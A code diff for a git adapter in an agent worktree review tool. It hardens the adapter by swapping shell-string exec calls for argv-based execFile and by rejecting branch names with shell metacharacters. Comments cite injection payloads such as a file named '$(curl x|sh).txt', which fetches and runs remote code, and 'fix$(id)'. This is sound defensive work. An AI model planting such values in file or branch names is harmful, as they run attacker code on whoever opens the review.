@@ -1,12 +1,75 @@
-import { exec, execSync } from 'node:child_process';
+import { execFile, execFileSync } from 'node:child_process';
 import { promisify } from 'node:util';
-import { GitWorktreeEntry, IGitPort, DiffOptions } from '../ports/IGitPort';
+import { GitWorktreeEntry, IGitPort, DiffOptions, DiffError } from '../ports/IGitPort';
 import { MAIN_BRANCH_CANDIDATES } from '../constants';
 
-const execAsync = promisify(exec);
+// Every git call here is an argument array run WITHOUT a shell (execFile).
+//
+// They used to be strings for `exec`, with branch names, paths and file names
+// pasted inside double quotes — and inside double quotes `$(…)` and backticks
+// still run. An agent only had to leave an untracked file called
+// `$(curl x|sh).txt` in its worktree for opening the review panel to execute
+// it, and a branch name is allowed to carry the same thing. With no shell in
+// between there is nothing to escape and nothing to get wrong: a value is a
+// single argv entry, however strange it is.
+const execFileAsync = promisify(execFile);
 // git worktree add on a huge repo streams a lot of "Updating files" progress to
 // stderr — give it room so exec never fails with "maxBuffer exceeded".
 const MAX_BUFFER = 1024 * 1024 * 64;
+
+/** `git <args>` in cwd, no shell. Resolves with stdout, rejects on non-zero exit. */
+async function git(args: string[], cwd: string): Promise<string> {
+  const { stdout } = await execFileAsync('git', args, { cwd, maxBuffer: MAX_BUFFER });
+  return stdout;
+}
+
+/** Synchronous twin of git(), for the parts of the port that are synchronous. */
+function gitSync(args: string[], cwd: string): string {
+  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: 'pipe', maxBuffer: MAX_BUFFER });
+}
+
+/**
+ * Characters that make a shell DO something — expand, substitute, chain,
+ * redirect, or end a quote. Git accepts every one of them except the backslash
+ * in a branch name, which is why check-ref-format alone is not enough. Kept to
+ * that list on purpose: `#`, `{`, `+` and friends are inert mid-word, and real
+ * branch names (`fix/#123`) use them.
+ */
+const SHELL_ACTIVE = /[$`"'\\;|&<>()!]/;
+
+/**
+ * Refuse a branch name before a worktree is made for it.
+ *
+ * `git check-ref-format --branch` is git's own rule (no `..`, no spaces, no
+ * leading `-` that would read as an option, …), so the answer matches what git
+ * would have said, only earlier and in a sentence a person can act on.
+ *
+ * On top of it, shell-active characters are refused even though git allows
+ * them. The worktree DIRECTORY is named after the branch, and that path goes on
+ * to places that are command lines by nature — the tmux session's start
+ * directory, the docker compose `-f` paths, the setup script typed into a
+ * terminal. Those quote it, but a name like `fix$(id)` has no legitimate use,
+ * and refusing it here closes the door on any command line that forgets to.
+ */
+export function assertCreatableBranchName(branch: string, repoRoot: string): void {
+  if (SHELL_ACTIVE.test(branch)) {
+    throw new Error(`"${branch}" is not a usable branch name: it contains characters a shell would interpret.`);
+  }
+  try {
+    gitSync(['check-ref-format', '--branch', branch], repoRoot);
+  } catch {
+    throw new Error(`"${branch}" is not a valid git branch name.`);
+  }
+}
+
+/** Short reason from a failed git call: its stderr's first line, else the message. */
+function reasonOf(err: unknown): string {
+  const e = err as { stderr?: string | Buffer; message?: string } | undefined;
+  const stderr = e?.stderr?.toString().trim();
+  const text = stderr || e?.message || String(err);
+  const line = text.split('\n').find((l) => l.trim()) ?? text;
+  return line.replace(/^(fatal|error):\s*/i, '').trim();
+}
 
 /**
  * Parses `git worktree list --porcelain` output.
@@ -33,8 +96,7 @@ export function parseWorktreeList(output: string): GitWorktreeEntry[] {
 export class GitCliAdapter implements IGitPort {
   listWorktrees(repoRoot: string): GitWorktreeEntry[] {
     try {
-      const output = execSync('git worktree list --porcelain', { cwd: repoRoot, encoding: 'utf8' });
-      return parseWorktreeList(output);
+      return parseWorktreeList(gitSync(['worktree', 'list', '--porcelain'], repoRoot));
     } catch {
       return [];
     }
@@ -54,12 +116,17 @@ export class GitCliAdapter implements IGitPort {
     // trackRemote is the third case: the branch exists only on the remote. It
     // must start from that ref and track it, or the work already pushed there is
     // silently replaced by an empty branch cut from the base.
-    const cmd = trackRemote
-      ? `git worktree add --track -b "${branch}" "${worktreePath}" "${trackRemote}"`
+    //
+    // The name is checked before git sees it, existing branches included: the
+    // worktree directory is named after it either way (see
+    // assertCreatableBranchName). `--` keeps a path that starts with `-` a path.
+    assertCreatableBranchName(branch, repoRoot);
+    const args = trackRemote
+      ? ['worktree', 'add', '--track', '-b', branch, '--', worktreePath, trackRemote]
       : newBranch
-      ? `git worktree add -b "${branch}" "${worktreePath}"${baseBranch ? ` "${baseBranch}"` : ''}`
-      : `git worktree add "${worktreePath}" "${branch}"`;
-    await execAsync(cmd, { cwd: repoRoot, maxBuffer: MAX_BUFFER });
+      ? ['worktree', 'add', '-b', branch, '--', worktreePath, ...(baseBranch ? [baseBranch] : [])]
+      : ['worktree', 'add', '--', worktreePath, branch];
+    await git(args, repoRoot);
   }
 
   /**
@@ -72,12 +139,12 @@ export class GitCliAdapter implements IGitPort {
    */
   remoteBranch(branch: string, repoRoot: string): string | undefined {
     try {
-      const remotes = execSync('git remote', { cwd: repoRoot, encoding: 'utf8' })
+      const remotes = gitSync(['remote'], repoRoot)
         .split('\n').map((r) => r.trim()).filter(Boolean);
       for (const remote of remotes) {
         const ref = `${remote}/${branch}`;
         try {
-          execSync(`git rev-parse --verify --quiet "${ref}^{commit}"`, { cwd: repoRoot, stdio: 'pipe' });
+          gitSync(['rev-parse', '--verify', '--quiet', '--end-of-options', `${ref}^{commit}`], repoRoot);
           return ref;
         } catch { /* try the next remote */ }
       }
@@ -99,10 +166,9 @@ export class GitCliAdapter implements IGitPort {
 
   listBranches(repoRoot: string): string[] {
     try {
-      // The format must be quoted: unquoted parentheses are shell syntax.
-      const out = execSync(
-        "git for-each-ref --sort=-committerdate --format='%(refname:short)' refs/heads/",
-        { cwd: repoRoot, encoding: 'utf8' },
+      const out = gitSync(
+        ['for-each-ref', '--sort=-committerdate', '--format=%(refname:short)', 'refs/heads/'],
+        repoRoot,
       );
       return out.split('\n').map((l) => l.trim()).filter(Boolean);
     } catch {
@@ -111,16 +177,17 @@ export class GitCliAdapter implements IGitPort {
   }
 
   async deleteWorktree(worktreePath: string, repoRoot: string): Promise<void> {
-    await execAsync(`git worktree remove --force "${worktreePath}"`, { cwd: repoRoot, maxBuffer: MAX_BUFFER });
+    await git(['worktree', 'remove', '--force', '--', worktreePath], repoRoot);
   }
 
   deleteBranch(branch: string, repoRoot: string): void {
-    execSync(`git branch -D "${branch}"`, { cwd: repoRoot });
+    gitSync(['branch', '-D', '--', branch], repoRoot);
   }
 
   branchExists(branch: string, repoRoot: string): boolean {
     try {
-      execSync(`git rev-parse --verify "${branch}"`, { cwd: repoRoot, stdio: 'pipe' });
+      // --end-of-options: a name starting with `-` is a name, not a flag.
+      gitSync(['rev-parse', '--verify', '--end-of-options', branch], repoRoot);
       return true;
     } catch {
       return false;
@@ -128,7 +195,7 @@ export class GitCliAdapter implements IGitPort {
   }
 
   currentBranch(cwd: string): string {
-    return execSync('git branch --show-current', { cwd, encoding: 'utf8' }).trim();
+    return gitSync(['branch', '--show-current'], cwd).trim();
   }
 
   /** First candidate that resolves to a real ref (local or origin/), else undefined. */
@@ -136,7 +203,7 @@ export class GitCliAdapter implements IGitPort {
     for (const name of candidates) {
       for (const ref of [name, `origin/${name}`]) {
         try {
-          execSync(`git rev-parse --verify --quiet "${ref}^{commit}"`, { cwd, stdio: 'pipe' });
+          gitSync(['rev-parse', '--verify', '--quiet', '--end-of-options', `${ref}^{commit}`], cwd);
           return ref;
         } catch { /* try next */ }
       }
@@ -144,58 +211,64 @@ export class GitCliAdapter implements IGitPort {
     return undefined;
   }
 
+  /**
+   * Rejects with a DiffError when git fails. This used to swallow every failure
+   * into '', which the panel cannot tell from a clean tree — a broken repo, a
+   * missing git or a worktree deleted underneath all read "No changes to review".
+   */
   async diff(worktreePath: string, opts: DiffOptions): Promise<string> {
     try {
       if (opts.base === 'working') {
         // Tracked changes vs HEAD…
-        const tracked = await execAsync('git diff HEAD', { cwd: worktreePath, maxBuffer: MAX_BUFFER });
+        const tracked = await git(['diff', 'HEAD', '--'], worktreePath);
         // …plus untracked files rendered as additions (git diff HEAD omits them).
         const untracked = await this.untrackedDiff(worktreePath);
-        return tracked.stdout + untracked;
+        return tracked + untracked;
       }
       const candidates = opts.mainBranchCandidates ?? MAIN_BRANCH_CANDIDATES;
       const mainRef = this.resolveMainBranch(worktreePath, candidates);
       // Three-dot: diff from the merge-base, i.e. only what THIS branch introduced.
       // With no main ref (e.g. main itself, or a fresh repo) fall back to vs-HEAD.
       const range = mainRef ? `${mainRef}...HEAD` : 'HEAD';
-      const { stdout } = await execAsync(`git diff ${range}`, { cwd: worktreePath, maxBuffer: MAX_BUFFER });
-      return stdout;
-    } catch {
-      return '';
+      return await git(['diff', range, '--'], worktreePath);
+    } catch (err) {
+      throw new DiffError(reasonOf(err), err);
     }
   }
 
   /** Diff each untracked file against /dev/null so new files show up in the review. */
   private async untrackedDiff(cwd: string): Promise<string> {
-    try {
-      const { stdout } = await execAsync('git ls-files --others --exclude-standard -z', { cwd, maxBuffer: MAX_BUFFER });
-      const files = stdout.split('\0').filter(Boolean);
-      let out = '';
-      for (const file of files) {
-        try {
-          // Exit code 1 (differences found) is the normal case — swallow via `|| true`.
-          const { stdout: d } = await execAsync(
-            `git diff --no-index -- /dev/null "${file}" || true`,
-            { cwd, maxBuffer: MAX_BUFFER },
-          );
-          out += d;
-        /* v8 ignore next 2 -- `|| true` keeps git from erroring; defensive only */
-        } catch { /* binary / unreadable — skip */ }
+    // Not caught here: ls-files failing right after `git diff HEAD` succeeded
+    // means something is genuinely wrong, and diff() reports it rather than
+    // presenting a review with the new files silently missing.
+    const files = (await git(['ls-files', '--others', '--exclude-standard', '-z'], cwd))
+      .split('\0').filter(Boolean);
+    let out = '';
+    for (const file of files) {
+      // The name is whatever the agent called the file — `$(curl x|sh).txt`
+      // included. It is one argv entry here, never shell text.
+      try {
+        out += await git(['diff', '--no-index', '--', '/dev/null', file], cwd);
+      } catch (err) {
+        // --no-index exits 1 when the files differ, which against /dev/null is
+        // always; the diff is on stdout all the same. Any other exit is a file
+        // git could not read (vanished mid-listing, permissions) — skipped, so
+        // one bad file does not hide the rest of the review.
+        const e = err as { code?: unknown; stdout?: unknown };
+        if (e.code === 1 && typeof e.stdout === 'string') out += e.stdout;
       }
-      return out;
-    /* v8 ignore next 3 -- ls-files can't fail once `git diff HEAD` has succeeded */
-    } catch {
-      return '';
     }
+    return out;
   }
 
   async fetchBranch(cwd: string, remote: string, branch: string): Promise<void> {
-    // Both come from git's own output or a validated ref, but they land in a
-    // shell command, so anything that is not ref-shaped is refused rather than
-    // escaped.
+    // Both come from git's own output or a validated ref. There is no shell in
+    // the way any more, but anything that is not ref-shaped is still refused: a
+    // value starting with `-` would be read by git fetch as an option, and a
+    // remote can also be spelled as a URL or a path, which is not what this is for.
     for (const part of [remote, branch]) {
-      if (!/^[\w./-]+$/.test(part)) throw new Error(`refusing to fetch "${part}"`);
+      if (!/^[\w./][\w./-]*$/.test(part)) throw new Error(`refusing to fetch "${part}"`);
     }
-    await execAsync(`git fetch "${remote}" "${branch}"`, { cwd, maxBuffer: MAX_BUFFER });
+    await git(['fetch', remote, branch], cwd);
   }
 }
